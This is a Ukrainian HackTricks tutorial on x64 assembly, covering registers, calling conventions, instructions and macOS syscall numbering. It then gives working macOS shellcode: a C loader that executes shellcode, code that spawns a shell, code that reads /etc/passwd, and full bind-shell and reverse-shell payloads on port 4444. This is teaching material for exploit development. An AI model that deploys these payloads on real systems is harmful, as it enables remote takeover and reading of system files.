# Вступ до x64

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>

## **Вступ до x64**

x64, також відомий як x86-64, є архітектурою 64-бітних процесорів, яка переважно використовується в настільних комп'ютерах та серверному обчисленні. Походить від архітектури x86, розробленої Intel, і пізніше прийнятої AMD під назвою AMD64, це популярна архітектура в особистих комп'ютерах та серверах сьогодні.

### **Регістри**

x64 розширює архітектуру x86, маючи **16 регістрів загального призначення**, позначених як `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, та `r8` до `r15`. Кожен з них може зберігати значення **64-біт** (8 байт). Ці регістри також мають підрегістри на 32 біти, 16 біт та 8 біт для сумісності та виконання конкретних завдань.

1. **`rax`** - Традиційно використовується для **значень повернення** з функцій.
2. **`rbx`** - Часто використовується як **базовий регістр** для операцій з пам'яттю.
3. **`rcx`** - Зазвичай використовується для **лічильників циклів**.
4. **`rdx`** - Використовується у різних ролях, включаючи розширені арифметичні операції.
5. **`rbp`** - **Вказівник бази** для стекового кадру.
6. **`rsp`** - **Вказівник стеку**, який відстежує верх стеку.
7. **`rsi`** та **`rdi`** - Використовуються для **джерела** та **призначення** індексів у операціях з рядками/пам'яттю.
8. **`r8`** до **`r15`** - Додаткові регістри загального призначення, введені в x64.

### **Конвенція виклику**

Конвенція виклику x64 відрізняється в залежності від операційних систем. Наприклад:

* **Windows**: Перші **чотири параметри** передаються в регістри **`rcx`**, **`rdx`**, **`r8`**, та **`r9`**. Додаткові параметри поміщаються в стек. Значення повернення знаходиться в **`rax`**.
* **System V (зазвичай використовується в подібних до UNIX системах)**: Перші **шість цілих або вказівникових параметрів** передаються в регістри **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, та **`r9`**. Значення повернення також у **`rax`**.

Якщо у функції більше шести вхідних параметрів, **решта передається в стек**. **RSP**, вказівник стеку, повинен бути **вирівняний на 16 байт**, що означає, що адреса, на яку він вказує, повинна бути кратною 16 до будь-якого виклику. Це означає, що зазвичай нам потрібно переконатися, що RSP належним чином вирівняний у нашому шелл-коді перед викликом функції. Однак на практиці системні виклики працюють багато разів навіть якщо це вимога не виконується.

### Конвенція виклику в Swift

Swift має свою власну **конвенцію виклику**, яку можна знайти за посиланням [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Загальні Інструкції**

Інструкції x64 мають багатий набір, зберігаючи сумісність з раніше використовуваними інструкціями x86 та вводячи нові.

* **`mov`**: **Переміщення** значення з одного **регістра** або **місця в пам'яті** в інше.
* Приклад: `mov rax, rbx` — Переміщує значення з `rbx` в `rax`.
* **`push`** та **`pop`**: Додавання або вилучення значень з **стеку**.
* Приклад: `push rax` — Додає значення з `rax` на стек.
* Приклад: `pop rax` — Вилучає верхнє значення зі стеку в `rax`.
* **`add`** та **`sub`**: Операції **додавання** та **віднімання**.
* Приклад: `add rax, rcx` — Додає значення в `rax` та `rcx`, зберігаючи результат в `rax`.
* **`mul`** та **`div`**: Операції **множення** та **ділення**. Зауважте: вони мають конкретні поведінки щодо використання операндів.
* **`call`** та **`ret`**: Використовуються для **виклику** та **повернення з функцій**.
* **`int`**: Використовується для виклику програмного **переривання**. Наприклад, `int 0x80` використовувалося для системних викликів в 32-бітних x86 Linux.
* **`cmp`**: **Порівняння** двох значень та встановлення прапорців ЦП на основі результату.
* Приклад: `cmp rax, rdx` — Порівнює `rax` з `rdx`.
* **`je`, `jne`, `jl`, `jge`, ...**: **Умовні стрибки**, які змінюють потік управління на основі результатів попереднього `cmp` або тесту.
* Приклад: Після інструкції `cmp rax, rdx`, `je label` — Переходить на `label`, якщо `rax` дорівнює `rdx`.
* **`syscall`**: Використовується для **системних викликів** в деяких системах x64 (наприклад, сучасний Unix).
* **`sysenter`**: Оптимізована інструкція **системного виклику** на деяких платформах.

### **Пролог Функції**

1. **Додати старий вказівник бази**: `push rbp` (зберігає вказівник бази викликача)
2. **Перемістити поточний вказівник стеку в вказівник бази**: `mov rbp, rsp` (налаштовує новий вказівник бази для поточної функції)
3. **Виділити місце в стеці для локальних змінних**: `sub rsp, <розмір>` (де `<розмір>` - кількість байтів, необхідних)

### **Епілог Функції**

1. **Перемістити поточний вказівник бази в вказівник стеку**: `mov rsp, rbp` (звільнити локальні змінні)
2. **Вилучити старий вказівник бази зі стеку**: `pop rbp` (відновлює вказівник бази викликача)
3. **Повернення**: `ret` (повертає управління викликачу)
## macOS

### системні виклики

Існують різні класи системних викликів, ви можете [**знайти їх тут**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Потім ви можете знайти кожен номер системного виклику [**за цим посиланням**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Таким чином, для виклику системного виклику `open` (**5**) з класу **Unix/BSD** потрібно додати: `0x2000000`

Отже, номер системного виклику для виклику open буде `0x2000005`

### Шелл-коди

Для компіляції:

{% code overflow="wrap" %}
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
{% endcode %}

Для вилучення байтів:

{% code overflow="wrap" %}
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
{% endcode %}

<details>

<summary>С код для тестування shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Оболонка

Взято з [**тут**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) та пояснено.

{% tabs %}
{% tab title="з adr" %}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}

{% tab title="зі стеком" %}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}
{% endtabs %}

#### Читання за допомогою cat

Мета полягає в тому, щоб виконати `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, тому другий аргумент (x1) є масивом параметрів (які в пам'яті означають стек адрес).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Виклик команди за допомогою sh
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Прив'язка оболонки

Прив'язка оболонки з [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) на **порт 4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Зворотній Shell

Зворотній shell з [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Зворотній shell на **127.0.0.1:4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити свою **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.

</details>
